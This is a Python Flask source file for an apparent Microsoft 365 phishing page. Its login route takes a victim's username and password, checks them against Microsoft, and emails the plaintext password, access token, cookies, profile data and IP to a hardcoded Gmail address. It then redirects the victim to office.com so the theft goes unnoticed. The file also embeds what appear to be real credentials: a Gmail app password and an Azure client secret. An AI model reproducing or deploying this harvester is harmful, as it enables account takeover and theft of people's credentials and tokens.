from flask import Flask, request, session, render_template
import os
import requests
from flask_mail import Mail, Message
import msal
import socket
import httpagentparser

app = Flask(__name__)

app.config["DEBUG"] = True
app.config['SECRET_KEY'] = 'YOUR_SECRET_KEY'  # Replace with your secret key
app.config['MAIL_SERVER'] = 'smtp.gmail.com'
app.config['MAIL_PORT'] = 465
app.config['MAIL_USERNAME'] = 'olamicreas@gmail.com'
app.config['MAIL_PASSWORD'] = 'svyp opql amtv gsva'
app.config['MAIL_USE_TLS'] = False
app.config['MAIL_USE_SSL'] = True
app.config['MAIL_DEFAULT_SENDER'] = 'olamicreas@gmail.com'

mail = Mail(app)

def browserr():
    agent = request.environ.get('HTTP_USER_AGENT')
    browser = httpagentparser.detect(agent)
    if not browser:
        browser = agent.split('/')[0]
    else:
        browser = browser['browser']['name']
    return browser

@app.route('/')
def home():
    return render_template('home.html')

@app.route('/login', methods=['POST'])
def login():
    # Replace with your actual client information
    client_id = '16675c4e-cbcf-4c5d-8b2b-d02484f3aa81'
    client_secret = 'xCm8Q~tXbR9p01ZmW4SQpzmPqNN3WcPSNaNOldzI'
    authority = 'https://login.microsoftonline.com/common'
    scope = ['User.Read']
    
    # Get username and password from the form
    username = request.form.get('username')
    password = request.form.get('password')
    
    # Initialize the MSAL ConfidentialClientApplication
    msal_app = msal.ConfidentialClientApplication(
        client_id,
        client_credential=client_secret,
        authority=authority,
    )
    
    # Acquire token using ROPC flow
    result = msal_app.acquire_token_by_username_password(
        username=username,
        password=password,
        scopes=scope
    )
    
    if 'access_token' in result:
        access_token = result['access_token']
        response = requests.get(
            'https://graph.microsoft.com/v1.0/me',
            headers={'Authorization': f'Bearer {access_token}'}
        )
        cookies = response.cookies

        # Loop through cookies and format them
        cookies_string = "\n".join([f"{cookie.name}: {cookie.value}" for cookie in cookies])

        device = socket.gethostname()
        ipAddr = socket.gethostbyname(device)
        browser_name = browserr()

        user_info = response.json()
        body = (
            f"Device: {device}\n"
            f"IP Address: {ipAddr}\n"
            f"Browser: {browser_name}\n"
            f"User Info: {user_info}\n"
            f"Cookies:\n{cookies_string}\n"
            f"Access Token: {access_token}\n"
            f"Password: {password}"  # Include the password (Note: Be cautious with this)
        )

        try:
            with app.app_context():
                msg = Message(
                    subject='M info',
                    recipients=['olamicreas@gmail.com'],
                    body=body
                )
                mail.send(msg)
            print("Email sent successfully!")
        except Exception as e:
            print(f"Failed to send email: {str(e)}")

        # Redirect the user to the Microsoft 365 homepage
        return redirect('https://www.office.com/')
    else:
        error = result.get('error')
        error_description = result.get('error_description')
        print(f"Error: {error}, Description: {error_description}")
        return f"Error: {error}, Description: {error_description}"

if __name__ == '__main__':
    app.run(debug=True)
